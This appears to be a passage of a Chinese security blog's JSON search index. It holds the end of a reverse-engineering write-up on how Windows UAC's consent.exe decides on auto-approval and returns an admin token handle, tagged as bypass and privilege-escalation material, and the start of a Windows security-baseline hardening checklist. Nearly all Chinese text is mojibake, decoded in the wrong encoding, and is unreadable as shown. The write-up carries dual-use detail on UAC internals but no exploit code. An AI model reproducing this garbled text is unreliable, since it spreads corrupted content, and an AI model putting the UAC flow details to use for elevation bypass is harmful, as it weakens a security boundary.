0xdf231ff830 0x7ff9db47a032 [0x12] RPCRT4!LrpcIoComplete+0xc2 0xdf231ff970 0x7ff9dc990330 [0x13] ntdll!TppAlpcpExecuteCallback+0x260 0xdf231ffa10 0x7ff9dc9c2f86 [0x14] ntdll!TppWorkerThread+0x456 0xdf231ffa90 0x7ff9daa47344 [0x15] KERNEL32!BaseThreadInitThunk+0x14 0xdf231ffd90 0x7ff9dc9c26b1 [0x16] ntdll!RtlUserThreadStart+0x21 0xdf231ffdc0 0x0 1consent.exe ppid ç»“æ„ä½“é•¿åº¦ ç»“æ„ä½“åœ°å€ .jupteifzszsc{zoom:80%;} å¦‚ä¸Šæ‰€ç¤ºå¯ä»¥çœ‹åˆ° consent.exe çš„å‘½ä»¤è¡Œä¼ é€’äº†ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¸ºçˆ¶è¿›ç¨‹idï¼Œç»“æ„ä½“é•¿åº¦å’Œç»“æ„ä½“åœ°å€ã€‚é‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šï¼Œuacçš„ç›¸å…³ä¿¡æ¯å°±åœ¨è¯¥ç»“æ„ä½“ä¸­ï¼Œconsenté€šè¿‡è¯»å†™çˆ¶è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå°†ç”¨æˆ·æ“ä½œç»“æœå†™å…¥åˆ°å¯¹ç»“æ„ä½“å¯¹åº”çš„åœ°å€ä¸­ã€‚ï¼ˆè¿™é‡Œæœ‰å…´è¶£çš„åŒå­¦è¿˜å¯ä»¥çœ‹ä¸€ä¸‹consent.exeçš„è°ƒç”¨æµç¨‹ã€‚) æŸ¥çœ‹ç›¸å…³å‚æ•°è§£æçš„éƒ¨åˆ†å¦‚ä¸‹æ‰€ç¤ºï¼š å¯ä»¥çœ‹åˆ°å‘½ä»¤è¡Œå‚æ•°3çš„ç»“æ„ä½“å¯¹åº”çš„æ˜¯ _CONSENTUI_PARAM_HEADER ï¼Œç›®å‰åœ¨ç½‘ä¸Šæ‰¾ä¸åˆ°ç›¸å…³çš„ç»“æ„ï¼Œä¸è¿‡è¿™é‡Œéƒ½ä¸é‡è¦ï¼Œå¤§è‡´äº†è§£è¿™ä¸ªè¿‡ç¨‹å’Œæµç¨‹å³å¯ã€‚ consentui.exe çš„é‰´æƒä¸å›ä¼  è¿™é‡Œä¸»è¦è§‚å¯Ÿä¸€ä¸‹ consent.ui æ‹¿åˆ°å‚æ•°ä¹‹åæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œåˆæ˜¯å¦‚ä½•å°†è·å–çš„æƒé™å†™å›çš„ã€‚ åœ¨ WinMain å‡½æ•°ç»“æŸçš„åœ°æ–¹è°ƒç”¨äº† NtWriteVirtualMemory å†™å…¥äº† TargetHandle ï¼Œè€Œè¿™ä¸ª TargetHandle å°±æ˜¯åœ¨ CuiGetTokenForApp ä¸­è·å–åˆ°çš„ç®¡ç†å‘˜ token å¥æŸ„ã€‚æœ€ååˆæŠŠè¿™ä¸ªè¿™ä¸ªå¥æŸ„å†™å›åˆ°äº† _CONSENTUI_PARAM_HEADER+7 çš„ä½ç½®ã€‚ consentui çš„å¼¹çª—é€»è¾‘ é€šè¿‡åˆ†ææ‰¾åˆ°äº†å†³å®šæ˜¯å¦å¼¹çª—çš„å…³é”®å‡½æ•°ä¸º: å¦‚æœä¸Šè¿°åˆ¤æ–­éœ€è¦å¼¹çª—çš„è¯ï¼Œæœ€ç»ˆè·³è½¬åˆ° CuiStartBackgroundWindowAndSwitchToSecureDesktop å‡½æ•°å»æ‰§è¡Œæ“ä½œã€‚ä¸‹é¢å°± CuiCheckElevationAutoApprovalMedium å‡½æ•°å±•å¼€çœ‹ä¸€ä¸‹åˆ¤æ–­çš„é€»è¾‘ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œåœ¨å‡½æ•°å†…éƒ¨é¦–å…ˆæ˜¯åˆ¤æ–­comç»„ä»¶æ˜¯ä¸æ˜¯è‡ªæå‡çš„ç»„ä»¶ï¼Œè°ƒç”¨çš„ CuiIsCOMClassAutoApprovable å¹¶ä¸”ä¼ å…¥äº†COMç»„ä»¶çš„GUIDã€‚ åˆ¤æ–­å®Œæˆä¹‹åè¿˜éœ€è¦å‡ æ¬¡è·³è½¬æ‰èƒ½åˆ°å¼¹çª—çš„å‡½æ•°ã€‚ä»¥ä¸Šå°±æ˜¯ consent.exe çš„å¼¹çª—é€»è¾‘äº†ã€‚ å…³é”®ç‚¹å¤§æ¦‚å°±æ˜¯ä»¥ä¸Šä¸‰ç‚¹ï¼Œé€šè¿‡ RAiLuanchAdminProcess åˆ›å»º consent.exeï¼Œconsent.exe é€šè¿‡CuiIsCOMClassAutoApprovable æ£€æŸ¥ comç»„ä»¶ æƒé™ï¼ŒCuiStartBackgroundWindowAndSwitchToSecureDesktop åˆ›å»ºç•Œé¢uiè·å–æƒé™ï¼ŒNtWriteVirtualMemory å†™å†…å­˜æ–¹å¼å†™å…¥è·å–åˆ°æƒé™çš„å¥æŸ„ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://hodlyounger.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"poc","slug":"poc","permalink":"https://hodlyounger.github.io/tags/poc/"},{"name":"bypass","slug":"bypass","permalink":"https://hodlyounger.github.io/tags/bypass/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"å®‰å…¨","slug":"wiki/å®‰å…¨","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/"},{"name":"ææƒ","slug":"wiki/å®‰å…¨/ææƒ","permalink":"https://hodlyounger.github.io/categories/wiki/%E5%AE%89%E5%85%A8/%E6%8F%90%E6%9D%83/"}]},{"title":"ã€ç½‘å®‰ã€‘å®‰å…¨åŸºçº¿æ£€æŸ¥é¡¹","date":"2024-08-31T01:41:20.197Z","path":"wiki/å®‰å…¨/ã€ç½‘å®‰ã€‘å®‰å…¨åŸºçº¿æ£€æŸ¥é¡¹/","text":"[toc] ç³»ç»Ÿé…ç½®å®‰å…¨æ£€æŸ¥ 1. èº«ä»½é‰´åˆ« 1.1 å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥ä½¿ç®¡ç†å‘˜èƒ½å¤Ÿé€šè¿‡ç¡®ä¿æ—§å¯†ç ä¸è¢«è¿ç»­é‡æ–°ä½¿ç”¨æ¥å¢å¼ºå®‰å…¨æ€§ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸º90æˆ–è¾ƒå°‘çš„å¤©æ•°ï¼Œä½†ä¸æ˜¯0 ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¯†ç ç­–ç•¥\\å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.2 å¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®å®šä¹‰ç”¨æˆ·å¯†ç å¿…é¡»ä½¿ç”¨å¤šé•¿æ—¶é—´ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸º1æˆ–æ›´å¤§å¤©ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¯†ç ç­–ç•¥\\å¯†ç æœ€çŸ­ä½¿ç”¨æœŸé™ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.3 å¼ºåˆ¶å¯†ç å†å² å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥ä½¿ç®¡ç†å‘˜èƒ½å¤Ÿé€šè¿‡ç¡®ä¿æ—§å¯†ç ä¸è¢«è¿ç»­é‡æ–°ä½¿ç”¨æ¥å¢å¼ºå®‰å…¨æ€§ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸º24æˆ–æ›´å¤šå¯†ç ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¯†ç ç­–ç•¥\\å¼ºåˆ¶æ‰§è¡Œå¯†ç å†å²ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.4 å¯†ç é•¿åº¦æœ€å°å€¼ å†…å®¹æè¿°ï¼š å¯†ç é•¿åº¦æœ€å°å€¼è¶Šå¤§ï¼Œæš´åŠ›ç ´è§£éš¾åº¦å°±è¶Šé«˜ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸º14æˆ–æ›´å¤šå­—ç¬¦ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¯†ç ç­–ç•¥\\å¯†ç é•¿åº¦æœ€å°å€¼ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.5 å¯†ç å¿…é¡»ç¬¦åˆå¤æ‚æ€§è¦æ±‚ å†…å®¹æè¿°ï¼š å¦‚æœå¯ç”¨æ­¤ç­–ç•¥ï¼Œå¯†ç å¿…é¡»ç¬¦åˆä¸‹åˆ—æœ€ä½è¦æ±‚ï¼š ä¸åŒ…å«ç”¨æˆ·çš„å¸æˆ·åæˆ–ç”¨æˆ·å…¨åä¸­è¶…è¿‡ä¸¤ä¸ªçš„éƒ¨åˆ†è¿ç»­å­—ç¬¦ è‡³å°‘å…­ä¸ªå­—ç¬¦ åŒ…å«ä»¥ä¸‹ä¸‰ä¸ªç±»åˆ«çš„å­—ç¬¦ï¼š è‹±æ–‡å¤§å†™å­—æ¯ï¼ˆAåˆ°Zï¼‰ è‹±æ–‡å°å†™å­—æ¯ï¼ˆaåˆ°zï¼‰ ä»¥10ä¸ºåŸºæ•°çš„æ•°å­—ï¼ˆ0åˆ°9ï¼‰ éå­—æ¯å­—ç¬¦ï¼ˆä¾‹å¦‚ï¼Œï¼ï¼Œ$ï¼Œï¼ƒï¼Œï¼…ï¼‰ ä¸å±äºä»¥ä¸‹ä»»ä½•Unicodeå­—ç¬¦çš„å…¨éƒ¨ç±»åˆ«å‰å››ä¸ªç±»åˆ«ã€‚ç¬¬äº”ç±»å¯ä»¥æ˜¯åŒºåŸŸç‰¹å®šçš„ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºå¯ç”¨ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¯†ç ç­–ç•¥\\å¯†ç å¿…é¡»ç¬¦åˆå¤æ‚æ€§è¦æ±‚ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.6 ç”¨å¯è¿˜åŸçš„åŠ å¯†æ¥å‚¨å­˜å¯†ç  å†…å®¹æè¿°ï¼š é€šè¿‡è¿œç¨‹è®¿é—®æˆ– Internet èº«ä»½éªŒè¯æœåŠ¡(IAS)ä½¿ç”¨è´¨è¯¢æ¡æ‰‹èº«ä»½éªŒè¯åè®®(CHAP)éªŒè¯æ—¶éœ€è¦è®¾ç½®æ­¤ç­–ç•¥ã€‚åœ¨ Internet ä¿¡æ¯æœåŠ¡(IIS)ä¸­ä½¿ç”¨æ‘˜è¦å¼èº«ä»½éªŒè¯æ—¶ä¹Ÿéœ€è¦è®¾ç½®æ­¤ç­–ç•¥ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºç¦ç”¨ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¯†ç ç­–ç•¥\\ç”¨å¯è¿˜åŸçš„åŠ å¯†æ¥å‚¨å­˜å¯†ç ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.7 é˜»æ­¢Microsoftå¸æˆ· å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®é˜»æ­¢ç”¨æˆ·åœ¨æ­¤è®¡ç®—æœºä¸Šæ·»åŠ æ–°çš„ Microsoft å¸æˆ·ã€‚ å¦‚æœé€‰æ‹©â€œç”¨æˆ·ä¸èƒ½æ·»åŠ  Microsoft å¸æˆ·â€é€‰é¡¹ï¼Œç”¨æˆ·å°†ä¸èƒ½åœ¨æ­¤è®¡ç®—æœºä¸Šåˆ›å»ºæ–°çš„ Microsoft å¸æˆ·ï¼Œä¸èƒ½å°†æœ¬åœ°å¸æˆ·åˆ‡æ¢åˆ° Microsoft å¸æˆ·ï¼Œä¹Ÿä¸èƒ½å°†åŸŸå¸æˆ·è¿æ¥åˆ° Microsoft å¸æˆ·ã€‚å¦‚æœéœ€è¦åœ¨ä¼ä¸šä¸­é™åˆ¶ä½¿ç”¨ Microsoft å¸æˆ·ï¼Œè¿™æ˜¯é¦–é€‰é€‰é¡¹ã€‚ å¦‚æœé€‰æ‹©â€œç”¨æˆ·ä¸èƒ½æ·»åŠ  Microsoft å¸æˆ·æˆ–ä½¿ç”¨è¯¥å¸æˆ·ç™»å½•â€é€‰é¡¹ï¼Œåˆ™ç°æœ‰çš„ Microsoft å¸æˆ·ç”¨æˆ·å°†ä¸èƒ½ç™»å½•åˆ° Windowsã€‚é€‰ä¸­æ­¤é€‰é¡¹åï¼Œæ­¤è®¡ç®—æœºä¸Šçš„ç°æœ‰ç®¡ç†å‘˜å¯èƒ½æ— æ³•ç™»å½•å’Œç®¡ç†ç³»ç»Ÿã€‚ å¦‚æœç¦ç”¨æˆ–ä¸é…ç½®æ­¤ç­–ç•¥(æ¨è)ï¼Œåˆ™ç”¨æˆ·èƒ½å¤Ÿå°† Microsoft å¸æˆ·ç”¨äº Windowsã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8ï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºç”¨æˆ·ä¸èƒ½æ·»åŠ  Microsoft å¸æˆ·æˆ–ä½¿ç”¨è¯¥å¸æˆ·ç™»å½•ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\å¸æˆ·ï¼šé˜»æ­¢Microsoftå¸æˆ·ã€‚ 1.8 å¸æˆ·é”å®šé˜ˆå€¼ å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šå¯¼è‡´ç”¨æˆ·å¸æˆ·è¢«é”å®šçš„ç™»å½•å°è¯•å¤±è´¥çš„æ¬¡æ•°ã€‚åœ¨ç®¡ç†å‘˜é‡ç½®é”å®šå¸æˆ·æˆ–å¸æˆ·é”å®šæ—¶é—´æœŸæ»¡ä¹‹å‰ï¼Œæ— æ³•ä½¿ç”¨è¯¥é”å®šå¸æˆ·ã€‚å¯ä»¥å°†ç™»å½•å°è¯•å¤±è´¥æ¬¡æ•°è®¾ç½®ä¸ºä»‹äº 0 å’Œ 999 ä¹‹é—´çš„å€¼ã€‚å¦‚æœå°†å€¼è®¾ç½®ä¸º 0ï¼Œåˆ™æ°¸è¿œä¸ä¼šé”å®šå¸æˆ·ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸º10æˆ–è¾ƒå°‘çš„æ— æ•ˆç™»å½•å°è¯•ï¼Œä½†ä¸æ˜¯0 ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\äº¤äº’å¼ç™»å½•ï¼šè®¡ç®—æœºå¸æˆ·é”å®šé˜ˆå€¼ã€‚ æ³¨æ„ï¼š åŸŸè´¦æˆ·éœ€è¦è”ç³»åŸŸç®¡ç†å‘˜åšå¯¹åº”ä¿®æ”¹ã€‚ 1.9 å¸æˆ·é”å®šæŒç»­æ—¶é—´ å†…å®¹æè¿°ï¼š æ­¤ç­–ç•¥è®¾ç½®ç¡®å®šé”å®šå¸æˆ·ä¹‹å‰å¿…é¡»ç»è¿‡çš„æ—¶é—´é•¿åº¦è§£é”ï¼Œç”¨æˆ·å¯ä»¥å°è¯•å†æ¬¡ç™»å½•ã€‚è¯¥è®¾ç½®é€šè¿‡æŒ‡å®šæ•°å­—æ¥å®ç°é”å®šçš„å¸æˆ·å°†åœ¨å‡ åˆ†é’Ÿä¹‹å†…ä¸å¯ç”¨ã€‚å¦‚æœæ­¤ç­–ç•¥è®¾ç½®çš„å€¼é…ç½®ä¸º0ï¼Œé”å®šçš„å¸æˆ·å°†ä¿æŒé”å®šçŠ¶æ€ï¼Œç›´åˆ°ç®¡ç†å‘˜æ‰‹åŠ¨è§£é”ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸º1æˆ–æ›´å¤šåˆ†é’Ÿï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¸æˆ·é”å®šç­–ç•¥\\å¸æˆ·é”å®šæŒç»­æ—¶é—´ã€‚ æ³¨æ„ï¼š å¦‚æœå®šä¹‰äº†å¸æˆ·é”å®šé˜ˆå€¼ï¼Œåˆ™å¸æˆ·é”å®šæ—¶é—´å¿…é¡»å¤§äºæˆ–ç­‰äºé‡ç½®æ—¶é—´ã€‚åªæœ‰åœ¨æŒ‡å®šäº†å¸æˆ·é”å®šé˜ˆå€¼æ—¶ï¼Œæ­¤ç­–ç•¥è®¾ç½®æ‰æœ‰æ„ä¹‰ã€‚ 1.10 é‡ç½®è´¦å·é”å®šè®¡æ•°å™¨ å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šåœ¨æŸæ¬¡ç™»å½•å°è¯•å¤±è´¥ä¹‹åå°†ç™»å½•å°è¯•å¤±è´¥è®¡æ•°å™¨é‡ç½®ä¸º 0 æ¬¡é”™è¯¯ç™»å½•å°è¯•ä¹‹å‰éœ€è¦çš„æ—¶é—´ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\å¸æˆ·ç­–ç•¥\\å¸æˆ·é”å®šç­–ç•¥\\é‡ç½®å¸æˆ·é”å®šè®¡æ•°å™¨åã€‚ æ³¨æ„ï¼š å¦‚æœå®šä¹‰äº†å¸æˆ·é”å®šé˜ˆå€¼ï¼Œæ­¤é‡ç½®æ—¶é—´å¿…é¡»å°äºæˆ–ç­‰äºå¸æˆ·é”å®šæ—¶é—´ã€‚åªæœ‰åœ¨æŒ‡å®šäº†å¸æˆ·é”å®šé˜ˆå€¼æ—¶ï¼Œæ­¤ç­–ç•¥è®¾ç½®æ‰æœ‰æ„ä¹‰ã€‚ 1.11 å¯ç”¨å±å¹•ä¿æŠ¤ç¨‹åº å†…å®¹æè¿°ï¼š ç¡®ä¿ç»ˆç«¯åœ¨ä¸æ´»åŠ¨çš„çŠ¶æ€ä¸‹ï¼Œè¶…è¿‡ä¸€å®šæ—¶é—´åä¼šè‡ªåŠ¨è¿›å…¥å±å¹•ä¿æŠ¤çŠ¶æ€ã€‚é˜²æ­¢ç»ˆç«¯ç›—ç”¨ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºå¯ç”¨ï¼šç”¨æˆ·é…ç½®\\ç®¡ç†æ¨¡æ¿\\æ§åˆ¶é¢æ¿\\ä¸ªæ€§åŒ–\\å¯ç”¨å±å¹•ä¿æŠ¤ç¨‹åº æ³¨æ„ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤ç»„ç­–ç•¥è·¯å¾„å¯èƒ½ä¸å­˜åœ¨ã€‚ å®ƒç”±Microsoft Windows 7å’ŒServer 2008 R2ç®¡ç†æ¨¡æ¿ï¼ˆæˆ–æ›´æ–°ç‰ˆæœ¬ï¼‰é™„å¸¦çš„ç»„ç­–ç•¥æ¨¡æ¿ControlPanelDisplay.admx / admlæä¾›ã€‚ 2. è®¿é—®æ§åˆ¶ 2.1 Guest å¸æˆ·çŠ¶æ€ å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šæ˜¯å¯ç”¨è¿˜æ˜¯ç¦ç”¨æ¥å®¾å¸æˆ·ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºâ€œå·²ç¦ç”¨â€ï¼šæˆ‘çš„ç”µè„‘\\å³é”®\\ç®¡ç†\\è®¡ç®—æœºç®¡ç†ï¼ˆæœ¬åœ°ï¼‰/æœ¬åœ°ç”¨æˆ·å’Œç»„/ç”¨æˆ·/ Guestå±æ€§/è´¦æˆ·å·²ç¦ç”¨ã€‚ æ³¨æ„ï¼š å¦‚æœæ¥å®¾å¸æˆ·è¢«ç¦ç”¨ä¸”å®‰å…¨é€‰é¡¹â€œç½‘ç»œè®¿é—®: æœ¬åœ°å¸æˆ·çš„å…±äº«å’Œå®‰å…¨æ¨¡å‹â€è¢«è®¾ç½®ä¸ºâ€œä»…æ¥å®¾â€ï¼Œåˆ™ç½‘ç»œç™»å½•(å¦‚ç”± Microsoft ç½‘ç»œæœåŠ¡å™¨(SMB æœåŠ¡)æ‰€æ‰§è¡Œçš„ç½‘ç»œç™»å½•)å°†å¤±è´¥ã€‚ 2.2 ä½¿ç”¨ç©ºå¯†ç çš„æœ¬åœ°å¸æˆ·åªå…è®¸è¿›è¡Œæ§åˆ¶å°ç™»å½• å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šæœªè¿›è¡Œå¯†ç ä¿æŠ¤çš„æœ¬åœ°å¸æˆ·æ˜¯å¦å¯ä»¥ç”¨äºä»ç‰©ç†è®¡ç®—æœºæ§åˆ¶å°ä¹‹å¤–çš„ä½ç½®ç™»å½•ã€‚å¦‚æœå¯ç”¨æ­¤è®¾ç½®ï¼Œåˆ™æœªè¿›è¡Œå¯†ç ä¿æŠ¤çš„æœ¬åœ°å¸æˆ·å°†ä»…èƒ½å¤Ÿé€šè¿‡è®¡ç®—æœºçš„é”®ç›˜ç™»å½•ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè¯·å°†ä»¥ä¸‹UIè·¯å¾„è®¾ç½®ä¸ºå·²å¯ç”¨ï¼šè®¡ç®—æœºé…ç½®\\Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\å¸æˆ·ï¼šä½¿ç”¨ç©ºå¯†ç çš„æœ¬åœ°å¸æˆ·åªå…è®¸è¿›è¡Œæ§åˆ¶å°ç™»å½•ã€‚ æ³¨æ„ï¼š 1ã€æ­¤è®¾ç½®ä¸å½±å“ä½¿ç”¨åŸŸå¸æˆ·çš„ç™»å½•ã€‚ 2ã€ä½¿ç”¨è¿œç¨‹äº¤äº’å¼ç™»å½•çš„åº”ç”¨ç¨‹åºå¯ä»¥ç»•è¿‡æ­¤è®¾ç½®ã€‚ 3ã€åœ¨ä»¥å‰ç‰ˆæœ¬çš„ Windows Server ä¸­ï¼Œè¿œç¨‹æ¡Œé¢æœåŠ¡ç§°ä¸ºç»ˆç«¯æœåŠ¡ã€‚ 2.3 å¸æˆ·: é‡å‘½åæ¥å®¾å¸æˆ· å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šæ˜¯å¦å­˜åœ¨å¦ä¸€ä¸ªå¸æˆ·åç§°ä¸å¸æˆ· â€œGuestâ€ çš„å®‰å…¨æ ‡è¯†ç¬¦(SID)ç›¸å…³è”ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\å¸æˆ·: é‡å‘½åæ¥å®¾å¸æˆ· 2.4 å¸æˆ·: é‡å‘½åç®¡ç†å‘˜å¸æˆ· å†…å®¹æè¿°ï¼š æ­¤å®‰å…¨è®¾ç½®ç¡®å®šæ˜¯å¦å­˜åœ¨å¦ä¸€ä¸ªå¸æˆ·åç§°ä¸å¸æˆ· Administrator çš„å®‰å…¨æ ‡è¯†ç¬¦(SID)ç›¸å…³è”ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\å¸æˆ·: é‡å‘½åç®¡ç†å‘˜å¸æˆ· 2.5 äº¤äº’å¼ç™»å½•: æç¤ºç”¨æˆ·åœ¨å¯†ç è¿‡æœŸä¹‹å‰æ›´æ”¹å¯†ç  å†…å®¹æè¿°ï¼š ç¡®å®šæå‰å¤šé•¿æ—¶é—´(ä»¥å¤©ä¸ºå•ä½)å‘ç”¨æˆ·å‘å‡ºå…¶å¯†ç å³å°†è¿‡æœŸçš„è­¦å‘Šã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\äº¤äº’å¼ç™»å½•: æç¤ºç”¨æˆ·åœ¨å¯†ç è¿‡æœŸä¹‹å‰æ›´æ”¹å¯†ç ã€‚ 2.6 äº¤äº’å¼ç™»å½•: ä¸æ˜¾ç¤ºä¸Šæ¬¡ç™»å½• å†…å®¹æè¿°ï¼š è¯¥å®‰å…¨è®¾ç½®ç¡®å®š Windows ç™»å½•å±å¹•æ˜¯å¦å°†æ˜¾ç¤ºä¸Šæ¬¡ç™»å½•è¯¥å°ç”µè„‘çš„äººå‘˜çš„ç”¨æˆ·åï¼Œå¦‚æœå¯ç”¨è¯¥ç­–ç•¥ï¼Œå°†ä¸æ˜¾ç¤ºç”¨æˆ·åã€‚å¦‚æœç¦ç”¨è¯¥ç­–ç•¥ï¼Œå°†æ˜¾ç¤ºç”¨æˆ·åã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\äº¤äº’å¼ç™»å½•: ä¸æ˜¾ç¤ºä¸Šæ¬¡ç™»å½•ã€‚ 2.7 å…³æœº: æ¸…é™¤è™šæ‹Ÿå†…å­˜é¡µé¢æ–‡ä»¶ å†…å®¹æè¿°ï¼š å¯ç”¨æ­¤ç­–ç•¥ä¼šåœ¨å¹²å‡€å…³æœºæ—¶æ¸…é™¤ç³»ç»Ÿé¡µé¢æ–‡ä»¶ã€‚å¯ç”¨æ­¤å®‰å…¨é€‰é¡¹æ—¶ï¼Œå¦‚æœç¦ç”¨ä¼‘çœ ï¼Œä¼‘çœ æ–‡ä»¶(hiberfil.sys)ä¹Ÿä¼šè¢«æ¸…é›¶ã€‚ åŠ å›ºå»ºè®®ï¼š Windows10/8/7/XPï¼šè®¡ç®—æœºé…ç½®\\ Windowsè®¾ç½®\\å®‰å…¨è®¾ç½®\\æœ¬åœ°ç­–ç•¥\\å®‰å…¨é€‰é¡¹\\å…³æœº: æ¸…é™¤è™šæ‹Ÿå†…å­˜é¡µé¢æ–‡ä»¶ã€‚ 2.8 æ“ä½œç³»ç»ŸUACç”¨æˆ·è´¦æˆ·æ§åˆ¶æ˜¯å¦å¼€å¯è‡³æŒ‡å®šçº§åˆ« å†…å®¹æè¿°ï¼š ç”¨æˆ·è´¦æˆ·æ§åˆ¶æœ‰åŠ©äºé¢„é˜²æœ‰å®³ç¨‹åºå¯¹ä½ 